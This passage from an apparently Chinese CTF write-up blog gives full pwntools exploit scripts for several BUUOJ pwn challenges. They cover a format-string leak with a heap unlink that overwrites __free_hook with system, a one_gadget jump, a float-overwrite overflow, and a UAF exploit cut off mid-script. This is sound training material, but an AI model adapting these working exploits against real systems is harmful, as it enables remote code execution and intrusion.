class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> LibcSearcher</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>filename <span class=\"token operator\">=</span> <span class=\"token string\">'axb_2019_heap'</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>libcfile <span class=\"token operator\">=</span> <span class=\"token string\">'/home/walt/share/pwn/libc/libc6_2.23-0ubuntu10_amd64/libc/lib/x86_64-linux-gnu/libc-2.23.so'</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>libcfile<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>mode <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">1</span> <span class=\"token keyword\">else</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token operator\">+</span><span class=\"token string\">'_pe'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">29478</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>e <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token operator\">+</span><span class=\"token string\">'_pe'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">if</span> mode<span class=\"token operator\">==</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> <span class=\"token string\">'b printf'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">suspend</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">if</span> mode <span class=\"token operator\">==</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">choose</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'>> '</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">mal</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">,</span> size<span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'(0-10):'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Enter a size:\\n'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Enter the content: \\n'</span><span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>content<span class=\"token punctuation\">)</span><span class=\"token operator\">&lt;</span>size<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Enter an index:\\n'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Enter an index:\\n'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Enter the content: \\n'</span><span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>key <span class=\"token operator\">=</span> <span class=\"token number\">0x202040</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>notelist <span class=\"token operator\">=</span> <span class=\"token number\">0x202060</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>strind <span class=\"token operator\">=</span> <span class=\"token number\">7.5</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>lsmind <span class=\"token operator\">=</span> <span class=\"token number\">15</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>mainind <span class=\"token operator\">=</span> <span class=\"token number\">11</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>banner <span class=\"token operator\">=</span> <span class=\"token number\">0xb42</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'%11$p,%15$p'</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'name:'</span><span class=\"token punctuation\">,</span> payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'Hello, '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>main_a <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b','</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>lsm_ <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'main:'</span><span class=\"token operator\">+</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>main_a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'lsm:'</span><span class=\"token operator\">+</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>lsm_<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>notelist <span class=\"token operator\">+=</span> main_a <span class=\"token operator\">-</span> <span class=\"token number\">0x1186</span> </pre></td></tr><tr><td data-num=\"58\"></td><td><pre>lsm_a <span class=\"token operator\">=</span> lsm_ <span class=\"token operator\">-</span> <span class=\"token number\">240</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>obj <span class=\"token operator\">=</span> LibcSearcher<span class=\"token punctuation\">(</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">,</span> lsm_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>libcbase <span class=\"token operator\">=</span> lsm_a <span class=\"token operator\">-</span> obj<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>fh_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span>  obj<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'__free_hook'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>sys_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> obj<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x88</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'aa'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x88</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'aa'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x88</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'aa'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x88</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'/bin/sh\\0'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>c1i <span class=\"token operator\">=</span> notelist <span class=\"token operator\">+</span> <span class=\"token number\">0x10</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>payload <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">0</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x81</span><span class=\"token punctuation\">,</span> c1i<span class=\"token operator\">-</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">,</span> c1i<span class=\"token operator\">-</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x80</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">[</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p8<span class=\"token punctuation\">(</span><span class=\"token number\">0x90</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> flat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">8</span><span class=\"token punctuation\">:</span>fh_a<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">b'\\x80\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>sys_a<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">b'\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"oneshot_tjctf_2016\"><a class=\"markdownIt-Anchor\" href=\"#oneshot_tjctf_2016\">#</a> oneshot_tjctf_2016</h1>\n<p>** 考点：**one_gadget</p>\n<p>拥有一次读取任意地址内容和跳转到任意地址的机会。</p>\n<p>读取任意 libc 函数泄露 libc 地址，然后跳转到 one_gadget。</p>\n<p>libc 版本读取后为 <code>libc6_2.23-0ubuntu10_amd64</code> 。</p>\n<p><img data-src=\"./image-20231118224655913.png\" alt=\"image-20231118224655913\"></p>\n<p>对对应文件执行 <code>one_gadget</code>  查询。</p>\n<p><img data-src=\"./image-20231118224844697.png\" alt=\"image-20231118224844697\"></p>\n<p>执行跳转前程序将 eax 寄存器清零，因此直接选择第一个 one_gadget。</p>\n<p><img data-src=\"./image-20231118224910215.png\" alt=\"image-20231118224910215\"></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher3 <span class=\"token keyword\">import</span> LibcSearcher</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>e<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./oneshot_tjctf_2016'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#p=process('./oneshot_tjctf_2016')</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">26936</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">#gdb.attach(p, 'b __isoc99_scanf')</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>lsm_g <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Read location?'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>lsm_g<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'Value: '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>lsm_a <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>obj <span class=\"token operator\">=</span> LibcSearcher<span class=\"token punctuation\">(</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">,</span> lsm_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>libcbase <span class=\"token operator\">=</span> lsm_a <span class=\"token operator\">-</span>obj<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"18\"></td><td><pre>onegad <span class=\"token operator\">=</span> <span class=\"token number\">0x45216</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>onegad <span class=\"token operator\">+=</span> libcbase</pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Jump location?'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>onegad<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"./image-20231118224956769.png\" alt=\"image-20231118224956769\"></p>\n<h1 id=\"护网杯_2018_gettingstart\"><a class=\"markdownIt-Anchor\" href=\"#护网杯_2018_gettingstart\">#</a> 护网杯_2018_gettingstart</h1>\n<p>** 考点：** 浮点数储存</p>\n<p>查看汇编找到浮点数对应的十六进制，缓冲区溢出将对应变量覆盖为对应值。</p>\n<p><img data-src=\"./image-20231119000514776.png\" alt=\"image-20231119000514776\"></p>\n<p><img data-src=\"./image-20231119000436805.png\" alt=\"image-20231119000436805\"></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>filename <span class=\"token operator\">=</span> <span class=\"token string\">'2018_gettingStart'</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>mode <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">1</span> <span class=\"token keyword\">else</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">\"./\"</span><span class=\"token operator\">+</span>filename<span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">26360</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>fl <span class=\"token operator\">=</span> <span class=\"token number\">0x3FB999999999999A</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>num <span class=\"token operator\">=</span> <span class=\"token number\">0x7FFFFFFFFFFFFFFF</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>flat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">[</span>num<span class=\"token punctuation\">,</span> fl<span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>p<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"./image-20231119000719983.png\" alt=\"image-20231119000719983\"></p>\n<h1 id=\"gyctf_2020_some_thing_exceting\"><a class=\"markdownIt-Anchor\" href=\"#gyctf_2020_some_thing_exceting\">#</a> gyctf_2020_some_thing_exceting</h1>\n<p>** 考点：**heap, uaf</p>\n<p>**libc 版本：**libc6_2.23</p>\n<p>未开启 PIE。</p>\n<p><img data-src=\"./image-20231119001138545.png\" alt=\"image-20231119001138545\"></p>\n<p>程序开始将 flag 放在.bss 段上。</p>\n<p><img data-src=\"./image-20231119001154173.png\" alt=\"image-20231119001154173\"></p>\n<p>free 后不清空地址，块管理块模式。</p>\n<p>对某个 0x10 管理块释放后分配为用户块，将 flag 的地址填入，然后输出。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>filename <span class=\"token operator\">=</span> <span class=\"token string\">'gyctf_2020_some_thing_exceting'</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>libcfile <span class=\"token operator\">=</span> <span class=\"token string\">'/home/walt/share/pwn/libc/libc6_2.23-0ubuntu10_amd64/libc/lib/x86_64-linux-gnu/libc-2.23.so'</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>libcfile<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>mode <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">1</span> <span class=\"token keyword\">else</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token operator\">+</span><span class=\"token string\">'_pe'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span 